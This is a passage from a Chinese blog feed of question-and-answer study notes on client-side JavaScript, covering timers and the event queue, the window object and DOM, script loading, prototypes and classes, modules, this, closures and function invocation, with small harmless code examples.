&lt;p&gt;这就需要控制script代码、js文件、css文件、大图片等在html中的位置。首屏尽量不通过js代码进行布局和css渲染显示效果，如果需要则这些js代码和css尽量靠前(head中)，防止出现闪烁现象。同步执行的js代码应尽量少，并且需要放置在合适的位置(首屏内容)。用来响应首屏用户交互的代码尽量靠后（首屏内容后面）。其他html内容、js文件、css文件、图片等使用动态加载方式，延迟加载。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_3&quot;&gt;White:客户端js的单线程模型是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 在浏览器中js的方法都是通过队列来调用的，每调用一个方法就把它加入执行队列，执行后从队列删除。回调函数就是在调用函数的最后调用回调函数。setTimeout和setInterval就是在指定时间向队列里面添加函数。clearTimeout和clearInterval就是告诉控制器不要再添加函数到队列中了。&lt;/p&gt;

&lt;p&gt;猜测：控制器是一个无限循环的函数，不停操作队列,也就是说js引擎本身不是单线程，但是用户可使用的是单线程。setTimeout等方法是其在指定时间那一刻添加到队列，如果间隔时间设置为0毫秒，并不是立即执行该函数，而是立即添加到队列，等前面的都执行完再执行它。如果时间间隔是10毫秒（其实浏览器响应事件有限制，好像是20ms以上，我觉得这个限制就是控制器的循环触发时间），那么每10ms都向队列添加一个函数。像单击按钮等用户操作相当于setTimeout(cb,0),尽快执行;&lt;/p&gt;

&lt;p&gt;在网上看到关于这个队列的权威的文章，作者john Resig是jquery的作者。请参见&lt;a href=&quot;http://ejohn.org/blog/how-javascript-timers-work/&quot;&gt;How JavaScript Timers Work&lt;/a&gt;。干脆自己也努力翻译一下吧&lt;a href=&quot;/2011/07/25/jsdg-chap14-timer.html&quot;&gt;javascript响应事件如何在单线程模型中工作&lt;/a&gt;。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js概述篇(一)</title>
   <link href="http://izhanghuaning.github.io/2011/07/05/jsdg-chap13-introduction.html"/>
   <updated>2011-07-05T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/07/05/jsdg-chap13-introduction</id>
   <content type="html">&lt;h4 id=&quot;whitejs&quot;&gt;White:什么是客户端js？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js分为原生js、客户端js、服务端js。原生js就是ECMAScript，是js标准，在客户端和服务端是一样的。客户端js就是在浏览器中使用的js，定义了window等一系列对象和方法，基于安全原因限制很多，不能操作文件、网络等。服务端js是可以类似java等构建整个应用的，可以操作网络、数据库、文件等。&lt;/p&gt;

&lt;p&gt;客户端js主要是指window对象，window对象是所有客户端js特性和api的主要接入点，它表示web浏览器的一个窗口或者窗体，并且可以通过window来引用它。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitewindow&quot;&gt;White:什么是window对象？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; window对象是客户端js的全局变量。web浏览器每次向窗口或窗体载入新的内容，它都会开始一个新的js上下文，包含一个新创建的全局对象。但是当多个窗口或窗体在使用时，有一个重要概念，尽管窗口或窗体载入了新的文档，但是引用窗口或窗体的window对象仍然是一个有效引用。&lt;/p&gt;

&lt;p&gt;所以客户端js有两个重要的对象。客户端全局对象处于作用域链的顶级，并且是全局变量和全局函数定义的地方。每个窗口或全体的window对象都是独立的，因为它们都是真是window的一个代理，我们所说的window对象实际上就是window proxy，没有办法能够引用到真正的window对象。&lt;/p&gt;

&lt;p&gt;注意：如果web页面包含一个嵌入窗体（iframe），嵌入窗体中的js代码和文档窗口中的js代码会各自拥有独立的全局对象，它可被当作一个独立的窗口。两者的js代码一般情况不能相互访问（可以通过window.name、url的hash、jsonp等方式访问）。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitedom&quot;&gt;White:什么是文档对象模型（DOM）？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 每个浏览器窗口、标签页和框架(iframe)都是由一个window对象所表示。每个window对象都有一个document属性引用了Document对象。Docuemnt对象表示窗口的内容，其并非是独立的，它是一个巨大的API的核心对象，叫做文档对象模型（DOM）。&lt;/p&gt;

&lt;p&gt;DOM是表示和操作HTML和XML文档内容的基础API。DOM是由Emenent组成的树形结构，其根节点就是Document对象。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitehtmljs&quot;&gt;White:html中使用js的方式有哪些？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js程序可以通过Document对象和它包含的Element对象遍历和管理文档内容。它可以通过操作CSS样式和类，修改文档内容的呈现。可以通过注册适当的事件处理程序来定义文档元素的行为。&lt;/p&gt;

&lt;p&gt;html中使用js的方式有如下几种：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;内联，放置在&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt;标签对之间。（少量js时可用）&lt;/li&gt;

&lt;li&gt;放置在由script标签的src属性指定的外部js文件中。（模块化，推荐）&lt;/li&gt;

&lt;li&gt;放置在html事件处理程序中，该事件处理程序由onclick等html属性指定。（不推荐）&lt;/li&gt;

&lt;li&gt;放在一个url中，这个url使用特殊的”javascript:”协议。（不推荐）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上面的推荐与否是根据：内容(html)和行为(js代码）应该尽量松耦合的原则，同理css也一样。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejsscript&quot;&gt;White:js中script标签的用法？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; script标签有多种用法：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;内敛js代码。&lt;/li&gt;

&lt;li&gt;外联js文件。&lt;/li&gt;

&lt;li&gt;内敛数据（type=”data”）。&lt;/li&gt;

&lt;li&gt;内敛模板（jquery.tmpl）。&lt;/li&gt;

&lt;li&gt;动态引入js文件。&lt;/li&gt;

&lt;li&gt;实现jsonp。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_htmljs&quot;&gt;White: html中js是如何加载执行的？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; html中的js代码首先需要加载，然后才能执行。&lt;/p&gt;

&lt;p&gt;第一阶段：打开一个新的窗口，这时候浏览器加载html文档，形成dom树，并在浏览器渲染加载内容。这时script标签只是加载的dom树中的一个元素，每加载完成一个script代码段(两个script构成封闭标签)或者js文件都会执行加载的js代码，这时候会阻塞浏览器的加载和渲染过程，也就是页面会卡死直到js代码执行完。js代码可能更改已经加载的dom的元素内容或者样式，所以js代码中操作的元素必须在之前加载好，否则会报错。如此反复直到页面加载完成。这个过程是同步操作。&lt;/p&gt;

&lt;p&gt;第二阶段：直到使用者操作页面上的按钮等元素，这时候异步调用相应的js代码，完成相应的操作。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;注意：&lt;/em&gt;&lt;/strong&gt;第一阶段说js的加载执行是同步的，是指普通的写在页面script中的js代码是这样加载和执行的。如果通过动态构造script的方式则其执行是异步的，此时的加载和其后面的js代码的执行是异步的（同时进行的），后面的代码不能依赖动态加载的js内容。有些浏览器支持HTML5的script元素的defer和async属性，它们告诉浏览器链接进来的脚本不会使用document.write这样的改变dom的操作，也不会生成文档内容，因此浏览器可以在下载脚本时继续解析和渲染文档。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitehtmlscriptasyncdefer&quot;&gt;White:html中script标签的async和defer属性的区别？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; defer属性使得浏览器延迟脚本的执行，知道文档的载入和解析完成，并可以操作。async属性使得浏览器可以尽快执行脚本，而不用在下载脚本时阻塞脚本解析。如果两个属性同时出现，async起作用。defer是延迟执行，是在所有文档解析后再按照其出现顺序执行。async是异步执行，加载后立即无序执行（先加载好的先执行），async类似动态script加载方式。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js模块篇类(十三)</title>
   <link href="http://izhanghuaning.github.io/2011/06/30/jsdg-chap9-class.html"/>
   <updated>2011-06-30T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/06/30/jsdg-chap9-class</id>
   <content type="html">&lt;h4 id=&quot;whitejs&quot;&gt;White:js中类是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 在js中，每个js对象都是一个属性集合，相互之间没有任何联系。当开发人员需要复用某个对象，想要共享某个对象的属性时，继承的概念就显现出来了。首先要定义一个模板类(class)，然后使用模板来生产相似的实例(instance)。每个实例都有模板定义的属性，是相似的对象，达到了复用的目的。&lt;/p&gt;

&lt;p&gt;在js中，继承是基于原型来实现的。如果两个实例从同一个原型对象继承了属性，我们就说它们是同一个类的实例，它们往往是由同一个构造函数创建并初始化的。&lt;/p&gt;

&lt;p&gt;关于构造函数请参见：&lt;a href=&quot;/2011/05/20/jsdg-chap4-expression-operators.html&quot;&gt;对象创建表达式和new关键字&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;调用构造函数的一个重要特征是：构造函数的prototype属性被用作新对象的原型，者意味着通过同一个构造函数创建的所有对象都继承字同一个对象，因此它们都是同一个类的实例。&lt;/p&gt;

&lt;p&gt;根据js约定俗称的做法，代表类的构造函数的首字母要大写，表明自己应该被new方式调用，如果使用普通方式调用就会出现意想不到的问题。new 关键字改变了函数的返回值、this，没有参数时可以省略括号。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_2&quot;&gt;White:js中类的标识是构造函数么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js中类的唯一标识是原型对象(__proto__)。当且仅当两个对象继承自同一个原型对象时，它们才属于同一个类的实例。而初始化对象状态的构造函数则不能作为类的标识，两个构造函数的prototype可能指向同一个原型对象，那么这两个构造函数创建的实例属于同一个类。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	function Animal() {
		this.belongto = &amp;quot;animal&amp;quot;;
	}
	
	function Cat() {
		this.belongto = &amp;quot;cat&amp;quot;;
	}

	function Dog() {
		this.belongto = &amp;quot;dog&amp;quot;;
	}

	Cat.prototype = Animal.prototype;
	Dog.prototype = Animal.prototype;

	var c = new Cat;
	var d = new Dog;
	c.__proto__ === d.__proto__ //=&amp;gt;true

	var proto = new	Animal
	Cat.prototype = proto;

	var c2 = new Cat;
	c.__proto__ === c2.__proto__ //=&amp;gt;false&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意：o instanceof Object时，instanceof运算符不会检查o是否由Object()构造函数初始化而来，而会检查o是否继承自Object.prototype。instanceof语法强化了”构造函数是类的公有标识的概念”，是类的”外在表现”。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_3&quot;&gt;White:js中类(函数)和实例(对象)中有哪几个重要属性？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js类中的重要属性有prototype,实例（类的原型prototype）的重要属性有原型(__proto__)、构造函数(constructor)。类也是对象，所以类也有__proto__、constructor，不过这两个属性都是指向Function类的，基本不会使用。&lt;/p&gt;

&lt;p&gt;举例说明：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	function Person() {}
	var p = new Person();

	Person.constructor === Function; //=&amp;gt;true
	Person.prototype === p.__proto__; //=&amp;gt;true
	Person.prototype.__proto__ === Object.prototype;//=&amp;gt;true
	Person.__proto__ === Function.prototype;//=&amp;gt;true
	Person.prototype.constructor === Person;//=&amp;gt;true

	p.__proto__ === Person.prototype;//=&amp;gt;true
	p.constructor === Person;//=&amp;gt;true&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_4&quot;&gt;White:js中检测实例的类的技术？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js中有三种检测实例的类的技术：instanceof运算符、consructor属性、构造函数的名字。每种方式都有其缺点。&lt;/p&gt;

&lt;p&gt;instanceof运算符：构造函数是类的公共标识，但原型是类的唯一标识。尽管instanceof运算符的右操作书是构造函数，但实际上是检测了对象的原型继承关系，而不是检测创建对象的构造函数。我们无法通过对象获得类名，只能检测对象是否属于指定的类名。&lt;/p&gt;

&lt;p&gt;constructor属性：并非所有的对象都有constructor属性。通过原型链每个对象都有constructor属性，但是可能是继承Object的，不是自己的。自定义对象原型需要自己定义constructor。通过默认的函数创建的对象默认有constructor属性，并且指向类构造函数。&lt;/p&gt;

&lt;p&gt;上述两种方式还有一个缺点，在多上下文的环境（比如两个页面），每个都有自己独立的全局变量和一组构造函数，一个页面的Array实例判断是否是另一个页面Array类是行不通的。&lt;/p&gt;

&lt;p&gt;构造函数的名称：并不是所有的函数都有名字，函数表达式没有名字。&lt;/p&gt;

&lt;p&gt;正式因为上述方式都有缺点，所以提出了”鸭式辩形”的策略，只关心行为，而不关心具体的类。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white&quot;&gt;White:”鸭式辩形”是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 像鸭子一样走路、游泳并且嘎嘎叫的鸟就是鸭子。&lt;/p&gt;

&lt;p&gt;鸭式辩形的核心思想就是重行为轻类型。检测行为而不检测类型。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js模块篇(十二)</title>
   <link href="http://izhanghuaning.github.io/2011/06/25/jsdg-chap9-module.html"/>
   <updated>2011-06-25T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/06/25/jsdg-chap9-module</id>
   <content type="html">&lt;h4 id=&quot;whitejs&quot;&gt;White:js模块的含义是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;将代码组织到类中的一个重要原因是，让代码更加”模块化”,可以在不同场景实现代码的复用。但类不是唯一的模块化代码的方式。一般来讲模块是一个独立的js文件。模块文件可以包含一个类定义、一组相关的类、一个函数库、一些待执行代码等。只要以模块的形式编写代码，任何js代码都可以当作一个模块。&lt;/p&gt;

&lt;p&gt;js模块化保证了js代码的可维护性和可复用性，提高了开发效率，产生了一大批优秀的js类库，比如jquery、spine等等。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white&quot;&gt;White:命名空间是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 现在的程序的规模越来越大，不只是一个组织内部很多人会参与到项目中来，而且程序中会用到大量第三方开发的类库、组件等，如果大家都把变量、函数等定义在顶层作用域中，那么就会导致命名冲突和相互影响，导致程序不能正常工作，也会进入无法维护的境地。命名空间就是用来把变量、函数等划分进不同模块的方法，通过对程序划分模块来提高可维护性和避免命名冲突。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_2&quot;&gt;White:js中命名空间使用函数来实现的？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js中只有一种作用域，即函数作用域，在js中无法声明只有某个代码快内可见的变量的。所以必须通过函数来做命名空间，在这个函数内定义的变量不会污染全局命名空间和其他命名空间。&lt;/p&gt;

&lt;p&gt;最常用的方式有一个专门的名称：立即函数&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	(function() {
		//模块代码
	}());

	或者

	(function mymodule() {
		//模块代码
	})();&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这两种方式基本等同，mymodule是函数表达式，最开始的()是告诉避免编译器把function当作函数声明语句。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_3&quot;&gt;White:js模块依赖关系管理是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;模块化解决的是js代码的松耦合，但是不同模块之间会有依赖管理，当模块很多时就迫切需要有一个模块依赖关系管理的功能。js本身不提供这样的功能。业界有commonjs模块规范可以参考，也有类似sea.js等库提供这样的功能。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js函数篇this(十一)</title>
   <link href="http://izhanghuaning.github.io/2011/06/20/jsdg-chap8-this.html"/>
   <updated>2011-06-20T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/06/20/jsdg-chap8-this</id>
   <content type="html">&lt;h4 id=&quot;whitethis&quot;&gt;White:this是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;this是一个关键字，不是变量，也不是属性名，js语法不允许给this赋值。和变量不同，关键字this没有作用域限制，嵌套的函数不会从外层函数中继承this，每个函数作用域即&lt;a href=&quot;/2011/05/15/jsdg-chap3-types-values-variables3.html&quot;&gt;变量对象VO&lt;/a&gt;都有自己的this。&lt;/p&gt;

&lt;p&gt;当内层嵌套函数想使用外层函数的this需要使用变量对this进行保存后使用。&lt;/p&gt;

&lt;p&gt;任何函数的调用都会隐式传入一个实参，这个实参是一个对象，方法调用的母体就是这个对象。如前所述，&lt;a href=&quot;/2011/06/10/jsdg-chap8-function.html&quot;&gt;函数有4中调用方式&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;如下所示，每种调用方式的this都有其作用方式，能够找到this指向的对象是很关键的。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitethisof&quot;&gt;White:this在方法调用o.f()中的作用？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;this是方法调用的核心，也就是谁正在调用方法,在f中的this就是o。如果f中包含嵌套函数g，那么函数g中的this 与f中的this没有任何联系，g中的this是window(global、undefined)。如果g中想要使用f中的this，一般的做法是在f中使用变量保存this的值，一般使用self或that作为变量名。这样在g中可以使用self指代f中的this。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitethisnew_f&quot;&gt;White:this在构造函数new f()中的作用？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;在构造函数中,新构造的对象会被关联到this，所以this.x中的x会成为新构造的对象的属性，最后返回新建构造函数。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitethisfunctioncallo&quot;&gt;White:this在function.call(o)中的作用？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;function.call或apply是显示指定调用上下文的间接调用方式，其第一个参数就是函数中this的值。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitethisf&quot;&gt;White:this在函数调用f()中的作用？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;在函数调用中，this的值是全局对象window。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js函数篇闭包(十)</title>
   <link href="http://izhanghuaning.github.io/2011/06/15/jsdg-chap8-closure.html"/>
   <updated>2011-06-15T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/06/15/jsdg-chap8-closure</id>
   <content type="html">&lt;h4 id=&quot;whitejs&quot;&gt;White:js中的闭包是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;和大多数现代编程语言一样，js也采用词法作用域，也就是说函数的执行依赖语变量作用域，”这个作用域是在函数定义时决定的，而不是函数调用时决定的”。为了实现这种词法作用域，js函数对象的内部状态不但包含函数的逻辑代码，还必须引用当前的作用域链（调用上下文）。函数对象可以通过作用域链相互关联起来，函数体内部的变量都可以保存在函数作用域内，看起来就像函数将变量”包裹”起来一样，称为”闭包”。&lt;/p&gt;

&lt;p&gt;这样来看每个函数内的变量都是”闭包”，但是实际中的概念却不是这个意思。&lt;/p&gt;

&lt;p&gt;在js中术语”闭包”一句话来说明就是：”从作用域A访问作用域B的变量，一般是只从外层作用域A访问内层作用域B。”&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_2&quot;&gt;White:js中闭包的作用有哪些？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;从技术角度讲，所有的js函数都是闭包：它们都是对象，它们都关联作用域链。定义大多数函数时的作用域在调用函数时仍然有效，但这并不影响闭包。&lt;/p&gt;

&lt;p&gt;当调用函数时闭包所指向的作用域链和定义函数时的作用域链不是同一个作用域链时，事情就不一样了。当一个函数嵌套了另外一个函数，外部函数将嵌套的函数作为返回值返回的时候往往会发生这种情况。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	var scope = &amp;quot;global scope&amp;quot;;
	function checkscope() {
		var scope = &amp;quot;local scope&amp;quot;;
		function f() { return scope; }
		return f;
	}

	checkscope()();//=&amp;gt;local scope&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最后一行返回的是”local scope”而不是”global scope”，这正是因为闭包作用的结果。闭包的这个特性强大的令人吃惊：它们可以捕捉到局部变量（和参数），并一直保存下来，看起来像这些变量绑定到了其中定义它们的外部函数。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_3&quot;&gt;White:js中闭包的本质是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;按照java、c#等其他语言很难理解闭包，因为在这些语言中，函数内的局部变量在函数返回后就不可访问了。但是在js中却不是这样的，我们回想一下js中&lt;a href=&quot;/2011/05/15/jsdg-chap3-types-values-variables3.html&quot;&gt;如何定义作用域链&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;我们将作用域链描述为一个列表，而不是绑定的栈。每次调用js函数的时候，都会创建一个新的对象(变量对象VO)来保存局部变量，并把这个对象添加至作用域链。当函数返回的时候就从作用域链中删除这个绑定对象，它就会被当作垃圾回收掉。但是如果一个函数A定义了嵌套函数B，每个嵌套函数B都各自对应一个作用域链，并且这个作用域链指向一个变量对象VO。如果函数A正常返回，则嵌套函数B所对应的变量对象VO也会被垃圾回收处理。但是如果函数A返回了嵌套函数B，则存在了一个引用指向了嵌套函数B的变量对象VO，那么变量对象VO就不会被垃圾回收处理，所以从函数A所在的上下文仍然可以使用嵌套变量对象VO的属性（变量、参数等）。这就是js中”闭包的本质”。&lt;/strong&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_4&quot;&gt;White:js中闭包在实践中有哪些例子？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js中闭包可以实现计数器，可以真正模拟私有变量，因为这些私有变量只能通过返回的函数访问。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	function counter() {
		var n = 0 ;
		return {
			count: function() { return n++ ;},
			reset: function() { n = 0;}
		};
	}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里返回了一组方法组成的一个对象，返回对象的所有方法都共享一个私有变量n，只有返回对象的方法可以访问私有变量n。&lt;/p&gt;

&lt;p&gt;这种方式是js模块化的基础，后面会详细介绍&lt;a href=&quot;/2011/06/25/jsdg-chap9-module.html&quot;&gt;js模块化&lt;/a&gt;。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW编程之js函数篇(九)</title>
   <link href="http://izhanghuaning.github.io/2011/06/10/jsdg-chap8-function.html"/>
   <updated>2011-06-10T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/06/10/jsdg-chap8-function</id>
   <content type="html">&lt;h4 id=&quot;whitejs&quot;&gt;White:js中的函数的重要意义是什么？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js中函数是核心中的核心。js中的函数是第一类对象，不同于java、C#等语言，可以说js的强大来源于其函数。&lt;/p&gt;

&lt;p&gt;函数是第一类对象代表：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;函数可以赋值给变量。&lt;/li&gt;

&lt;li&gt;函数可以作为参数传入其他函数。&lt;/li&gt;

&lt;li&gt;函数可以作为返回值。&lt;/li&gt;

&lt;li&gt;函数可以嵌套使用。&lt;/li&gt;

&lt;li&gt;js中只有函数作用域。&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_2&quot;&gt;White:js中函数和方法有什么区别？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js中函数调用还需要一个重要的概念：调用上下文，即this关键字的值。如果函数挂载在一个对象上，作为对象的一个属性，那么就称为该对象的方法。当通过对象来调用函数时，该对象就是此次调用的上下文，也就是this的值。&lt;/p&gt;

&lt;p&gt;没有直接使用对象来调用的函数（全局函数或者嵌套函数）就是普通意义上的函数，其this的值就是全局对象window（ECMAScript5好像严格模式下改了，成undefined了）。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_3&quot;&gt;White:js中函数定义的方式有哪些？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js中函数定义有三种方法：函数声明、函数表达式、new Function。&lt;/p&gt;

&lt;p&gt;函数声明(FD)的特点：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;有一个特定的名称。&lt;/li&gt;

&lt;li&gt;在源代码中的位置：程序级 和 函数体内。&lt;/li&gt;

&lt;li&gt;在进入上下文阶段创建，会变量提前。&lt;/li&gt;

&lt;li&gt;影响变量对象（VO）。&lt;/li&gt;

&lt;li&gt;声明方式 &lt;code&gt;function funcName(arg,arg2,...) {...}&lt;/code&gt;。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;函数表达式(FE)特点：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;可以有可选名称（只能在函数内使用，主要用于调试）。&lt;/li&gt;

&lt;li&gt;在源代码中的位置： 可以使用表达式的地方。&lt;/li&gt;

&lt;li&gt;在代码的执行阶段创建，不会变量提前。&lt;/li&gt;

&lt;li&gt;不会影响变量对象（VO）。&lt;/li&gt;

&lt;li&gt;声明方式&lt;code&gt;var funcName = function(arg1...) {...}&lt;/code&gt;。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;任何函数都是Function的一个实例，所以可以通过&lt;code&gt;var funcName = Function(&amp;quot;x&amp;quot;,&amp;quot;y&amp;quot;,&amp;quot;return x*y;&amp;quot;&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;Function方式的特点：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;允许js在运行时动态创建并编译函数。&lt;/li&gt;

&lt;li&gt;每次调用Function都会解析函数体，并创建新的函数对象。&lt;/li&gt;

&lt;li&gt;不使用本地作用域，只使用顶级作用域。&lt;/li&gt;

&lt;li&gt;此方法很少用到。&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_4&quot;&gt;White:js中函数的调用方式有哪些？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js中创建对象有四种方式：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;作为函数&lt;/li&gt;

&lt;li&gt;作为方法&lt;/li&gt;

&lt;li&gt;作为构造函数&lt;/li&gt;

&lt;li&gt;通过call或apply调用&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作为函数和方法调用是普通调用，其最终也是通过apply实现的，call是apply的一个愈发糖。它们的区别就是调用上下文this。&lt;/p&gt;

&lt;p&gt;通过构造函数调用请参见&lt;a href=&quot;/2011/05/20/jsdg-chap4-expression-operators.html&quot;&gt;对象创建表达式和new关键字&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;call和apply间接调用，js中函数也是对象，和其他js对象没有什么不同，函数对象也有其自己的方法，其中call和apply可以用来间接调用函数。这两个方法需要指定所需的this的值，也就是说函数可以指定任何对象作为其this的值，哪怕哪个对象没有这个方法，这就可以实现函数借用。形式如&lt;code&gt;func.call(othis,arg1,arg2...);&lt;/code&gt;其中othis是传入的对象作为func的this。&lt;/p&gt;

&lt;p&gt;ECMAScript5新定义了一个bind方法，返回一个绑定了对象的方法，如&lt;code&gt;var g =f.bind(o); g();&lt;/code&gt;等同&lt;code&gt;f.call(o);&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;方法的调用还可以使用方括号的形式&lt;code&gt;o[&amp;quot;f&amp;quot;]();&lt;/code&gt;。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_5&quot;&gt;White:js中函数的形参和实参是什么概念？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;js中形参是可选的，实参是一个类数组对象（arguments)。形参是在定义函数时所声明的参&lt;code&gt;function f(arg1,arg2)&lt;/code&gt;中的arg1，arg2是形参，函数有一个length属性其值就是形参的个数。调用函数时传入的参数为实参，其不受形参影响，可多，可少。&lt;/p&gt;

&lt;p&gt;arguments是指向实参对象（Arguments）的引用，是一个类数组对象，可以通过索引来取得参数的值，并且通过索引和通过参数名arg1取得的是同一个值，通过任一方式操作都等价的，修改其中一个会影响另一个。&lt;/p&gt;

&lt;p&gt;arguments是一个对象，它也有自己的属性，callee代表正在执行的函数，caller代表调用正在执行的函数的函数（外层函数）。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejquery&quot;&gt;White:jquery中常见的参数对象是什么意思？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;函数中的参数越多，调用起来就越不方便，所以引出了参数对象的概念dto(data transfer object)，把所有参数封装为一个对象，对像赋值后直接传递给函数。对于jquery等类库基本都需要支持option的参数对象。&lt;/p&gt;

&lt;p&gt;实现类库注意事项有如下几点：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;通过立即函数封装模块，只提供最少的全局变量。&lt;/li&gt;

&lt;li&gt;提供配置参数对象。&lt;/li&gt;

